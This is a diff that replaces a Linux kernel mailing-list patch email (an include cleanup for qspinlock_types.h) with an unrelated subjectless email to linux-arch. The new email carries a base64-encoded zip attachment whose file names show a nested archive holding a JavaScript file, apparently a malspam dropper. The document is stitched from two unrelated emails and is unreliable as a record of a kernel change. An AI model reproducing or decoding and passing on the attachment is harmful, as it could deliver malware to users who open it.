@@ -1,67 +1,68 @@
-From: Yury Norov <ynorov@caviumnetworks.com>
-Subject: [PATCH resend] asm-generic: don't #include <linux/atomic.h> in qspinlock_types.h
-Date: Sat, 14 Oct 2017 03:06:35 +0300
-Message-ID: <20171014000635.7080-1-ynorov@caviumnetworks.com>
+From: <sherrilyn@oceansfleet.com>
+Subject: (unknown)
+Date: Sun, 15 Oct 2017 12:04:04 -0000
+Message-ID: <150806904437.32758.1297268281042657461@piastlan.net>
 Mime-Version: 1.0
-Content-Type: text/plain
+Content-Type: application/zip; name="582087541899203.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-arch-owner@vger.kernel.org>
-Received: from mail-bn3nam01on0083.outbound.protection.outlook.com ([104.47.33.83]:60192
-        "EHLO NAM01-BN3-obe.outbound.protection.outlook.com"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1753089AbdJNAGt (ORCPT <rfc822;linux-arch@vger.kernel.org>);
-        Fri, 13 Oct 2017 20:06:49 -0400
+Received: from pm252-148.piastlan.net ([194.116.252.148]:42297 "HELO
+        piastlan.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750917AbdJOMEG (ORCPT <rfc822;linux-arch@vger.kernel.org>);
+        Sun, 15 Oct 2017 08:04:06 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-arch-owner@vger.kernel.org
 List-ID: <linux-arch.vger.kernel.org>
-To: Will Deacon <will.deacon@arm.com>, Arnd Bergmann <arnd@arndb.de>, linux-kernel@vger.kernel.org, linux-arch@vger.kernel.org
-Cc: Yury Norov <ynorov@caviumnetworks.com>, Adam Wallis <awallis@codeaurora.org>, Andrew Pinski <Andrew.Pinski@cavium.com>, Catalin Marinas <catalin.marinas@arm.com>, Ingo Molnar <mingo@redhat.com>, Jan Glauber <jglauber@cavium.com>, Mark Rutland <mark.rutland@arm.com>, Peter Zijlstra <peterz@infradead.org>, Pan Xinhui <xinhui.pan@linux.vnet.ibm.com>
+To: linux-arch@vger.kernel.org
 
-The "qspinlock_types.h" doesn't need linux/atomic.h directly. So
-because of this, and because including of it requires the protection
-against recursive inclusion, it looks reasonable to move the
-inclusion exactly where it is needed. This change affects the x86_64
-arch, as the only user of qspinlocks at now. I have build-tested the
-change on x86_64 with CONFIG_PARAVIRT enabled and disabled.
-
-Rebased on next-20171012
-
-Signed-off-by: Yury Norov <ynorov@caviumnetworks.com>
-Acked-by: Arnd Bergmann <arnd@arndb.de>
----
- include/asm-generic/qspinlock.h       | 1 +
- include/asm-generic/qspinlock_types.h | 8 --------
- 2 files changed, 1 insertion(+), 8 deletions(-)
-
-diff --git a/include/asm-generic/qspinlock.h b/include/asm-generic/qspinlock.h
-index b37b4ad7eb94..0ae1e1692b9e 100644
---- a/include/asm-generic/qspinlock.h
-+++ b/include/asm-generic/qspinlock.h
-@@ -20,6 +20,7 @@
- #define __ASM_GENERIC_QSPINLOCK_H
- 
- #include <asm-generic/qspinlock_types.h>
-+#include <linux/atomic.h>
- 
- /**
-  * queued_spin_is_locked - is the spinlock locked?
-diff --git a/include/asm-generic/qspinlock_types.h b/include/asm-generic/qspinlock_types.h
-index 034acd0c4956..a13cc90c87fc 100644
---- a/include/asm-generic/qspinlock_types.h
-+++ b/include/asm-generic/qspinlock_types.h
-@@ -18,15 +18,7 @@
- #ifndef __ASM_GENERIC_QSPINLOCK_TYPES_H
- #define __ASM_GENERIC_QSPINLOCK_TYPES_H
- 
--/*
-- * Including atomic.h with PARAVIRT on will cause compilation errors because
-- * of recursive header file incluson via paravirt_types.h. So don't include
-- * it if PARAVIRT is on.
-- */
--#ifndef CONFIG_PARAVIRT
- #include <linux/types.h>
--#include <linux/atomic.h>
--#endif
- 
- typedef struct qspinlock {
- 	atomic_t	val;
--- 
-2.11.0
+UEsDBAoAAAAAALleT0uiM2l5bAoAAGwKAAAJAAAAMzEwMDQuemlwUEsDBBQAAAAIALleT0tPR4av
+1gkAAGIrAAAIAAAAMzEwMDQuanO1Wllz4kYQfk9V/gOhyllcThwbb9a7cflBEgJxiEuABKk8SOgE
+XUhCApL89wg2mR7bHUnZrbx4P0kzfX09PT3MyuYsUrLNoD2eCtbWqz3X3nm+w496GuemBKlRjeDV
+gECdoIygCUGWSaBN0JGgnbIckQc21jjy0PVA2zNB8M4nyMiQzwxBa4ISghzEPYMgBUzSCNrA93XS
+qCNOxzBg2g1B6y2MEAjkCRq4IOz6qZaARS4Eg6CFMyR4CxaDNKBjTpAI0ZBUKqwUnwRRxGYTizyY
+9nGHqFsSRNMI4ePAcg/iMEWCbmEvVb1RF/qIbSLE7AZ8Q5iOgGrfugV3osAjD5wNCmEifA4gJGBa
+g6BPBDWvwZg6kheBCYZlmE6jXuINZDCyEIAtylFkbuBxsCgp7fCW9phyFPfPc9aYEtR/xCeKSdTl
+L/D0pYNvmHzrFyzAm3oGMfaRIhdgK7/EGYq2yj4gCimv0IzlAjDTaNBpSSDG33oPIiJkEfpJCg9R
+jKRgAGNL2fyqABBE84vnLUElS5ag4iCBlENIqaHiBRCtTdUzunIM7NJqBR6XZUNsgyew71Abqgly
+c8FRXL954ZJPO1CZu8p1F2Pzv5O4LrTLo9I4hCzH+oc9xXthFQB7nhBf5dmpDQFG9vUU2aA7BPUE
+aAtg983WSJMxYtBuqvmB4A/vf2rCA4LeP8E8xMDAAf+hU5ghDrCwoc91pNMag/1tJFXkGuUAUFLS
+NiFVC22kqPaH6p+grZQQGm8hwYozuqRQMUimNUBgni3koSRtVp2esGCRnQrNDfAO0hUj+wBzFPAJ
+HKD6s2TZAltlAgUkpDFC1zarYT1/ZbbLmmQk+nO6SYagU9wWly2G4kyVkQVQQl6KrnAkcgsWpZNm
+8endU81zOT7T49YpnXS0PWtLTn6sM1LVbdRTNarffPtNvbYU1NHCGrIr3zTah/XY1cLnd5aRSMb6
+MiDw9fgCcnn5pJrfCVtCMNNTxd4fDTYX6BtZraVexiSXv0bj+te/xV6e2ctfUHB5DH9rXF/AU02W
+PquKnDC5lVzDCBv3d3d3+UHo8jrX+hnMTpd//F3Ero5Kf7/QeqY6f2XBWfkF/W3Ba+Xh5TlX/lS/
+fvr2G3PUWYkT2Z8xtjB3pTiY5vJenYVvIyN01bXRmBoWfwipg1/9h1rdql/nfy/CzpZOuIOvjFbW
+eqeKwxOjnSP0Thsy/C8nY3o0UgJVglyCGgTtCfINAuO1Ghowpk5QFhNoE3TVvLt6IE8t6j2Bd5SW
+DB3AELgmKHEIBHfASmVEoLYxsPmYpo/wkqAmfAbrYkRiRJATghpMIk9FynBd6gsgyrxPiIwHFvAd
+Fl94yYQqYo5dTMXVA85VMduYJzxBEoQFY8ShkrEdIImpI9OjuFD5x+LYJiDRC0GRSr1HKC/hC+An
+bApbLOfqZ4I5GEC9hOkl2osVfUTTXixLFT5CaocPzABvXrH6wq+fKOMYLPs/feVLfMADGFCZTgh3
+udKHQlHFXx85avodMqAs7a6aTboEIRl+gHclKZ5Xn7KiQ5BA0AzQuNCBu8LotNApPhifFQtn1pDa
+DrV3KASONAI3WMkqru4lNUeUYJOCl4NCl5sVKywlkKBBIROAxqjZ8BLfhipWG2A0tq+a+DaD01rK
+ZklvYNCdANBqrJP/XpaalBeQFy5sVVfUulJDakdxECtVyszApwpORdpL2wIstNgKlZB8jpC8V72c
+OkrXvyxEmJChnQO9/l4QRTAw9gUL8SWZb2PKtBA9rYp5zFOxiqjIwK6H6qxMH7abUMtFwEsoZd8I
+67H8q7KOqMOD4PNGAZ84mkN0rg0hARrCQu8YSmibxhGsCCB3CwsswCJ9BB7QmCBZEhQaShmEuXFf
+uQHk6FpnFp66YuANk0R3LGiK3lHVHS/qvERlBDTV6BZGYPX6T23+JYXHgZDgZw9Kv/DCmSZfWLSo
+5nWPBJZS9qKMlR5Qrx7o3gcVcoeS9kLII7q4YcAX1OPidB9BklPMV+a7aqWquPFLqDNqxfMCVZ/O
+3rwd+rKp+JczLYH3JZ40abux2P93u2Xq9wHsAFrxuCRU7t1A9RS0xEjhC3ys+LDwHSkWx+KMqZwo
+FDv/Q7+C/vgCUUM8jAtJoho2enMtOa9UXCCvK8vbCvtVxaK4RcEKq1r4C9sMiUXbcWFkcaEJsaqN
+/pJ03kS/4nREn+/xwpuvcLoOFa8lzgW/qWVTcpholltB0Bf8sGZDsF0X3h8MaKL2X1FzQjWxXxGC
+HxabxVRwVVcCfG1elbZYhaLQ6UFo+GU9HC33jt45KidbycKl+oFWncBrQE/v8l/zHbPWaMxOr68b
+fnx7BfKcX6Lmd6fnP9d//NF49T2f8UbKec79z4/3jx8+z7qu/X65XVm5Ah+aXktjO35vfBSVfy5s
+3t5T5Ncj9p6b6z3LWLbFwSbfnTqH54s79ZsDr3C6O8iv4NqyIMbdbXZTP3uW37b8edaTZMfhwF+Z
+Lcma8N4p1/Lm3uI2Dl0nabzVcX27CRy/kV95/BOkNL/43c1WbH+ua2O+bcuf3Xv/833zs3vff4+M
++e659nB//+Hjx5/uHx/fN5uXKHz7zU8/beNVi1VO5sZKHa6/GMuj7m6yZ6aCaEv6Zthve86Wi47T
+uZa2FL7jLkc9xh33M33AhjsxFjivZ57kQ6AsZlGy0iQ707YGM1SdSGkfetZSH9mxuebnYjL2mGyr
+dVPV3Di7SevYD0fLiB0mYtBZMb3Qlzeay3b36XxpWoO1Gmy40eQQOubW38kLoyV0ErvPKmFfaTtx
+tgl0iV9MTdt3xTQZxMlufdQEZtTL+Ehkh8qptdyGtjyc6tFKngnLbaxlI3GfuhPGkMTIPu1lnxsI
+5mbeXWWHRB/ySti25M7JaY+9yWrfZZdpkE3FnjqTdIHtqtpuJCsTc7EZu4d5JiWn6VZMl8ygKyx7
+W80M2XgsHjIj0Xl5f4qYXecc3BGnGPuU7zObFeu3LHGaRckg1DWJd5PMdiY7sWNyB8NiUmUQtObs
+Ick66pxb9qOetRqL25M/i7ve3p0ai73vbNmDK9l5ipkrbm61O0zoijtv1B3LA07dJlNruYgZfcAp
+HUlrBdmJ76Xqsh1tLXkxn/Wn++FyfzgNe+Gu35lkfv5/StYm042dgFu3W7vBcah7gjnpKPKcOWW8
+tOmxzmSmWm7X16N1lmrS0egnXls8rDhlnd/Lb3bpYeGI7knXhGXXmHWGkR0ceUPVo9F65myYZbBf
+9RP/mO0m41Qx7d4k2IjptNvRTmNZV2xvtVyow1PH1wcML8+FldLTVLHLhRPrqAzWM/HQS7ju1mc7
+fV4dTZxvvzkynB0NexuNnwh9Sf5nvb5aYNf5uvsLUEsBAj8AFAAAAAgAuV5PS09Hhq/WCQAAYisA
+AAgAJAAAAAAAAAAgAAAAAAAAADMxMDA0LmpzCgAgAAAAAAABABgAbSI68OZF0wFtIjrw5kXTAUqy
+x+/mRdMBUEsFBgAAAAABAAEAWgAAAPwJAAAAAFBLAQI/AAoAAAAAALleT0uiM2l5bAoAAGwKAAAJ
+ACQAAAAAAAAAIAAAAAAAAAAzMTAwNC56aXAKACAAAAAAAAEAGACmhjzw5kXTAaaGPPDmRdMBSrLH
+7+ZF0wFQSwUGAAAAAAEAAQBbAAAAkwoAAAAA
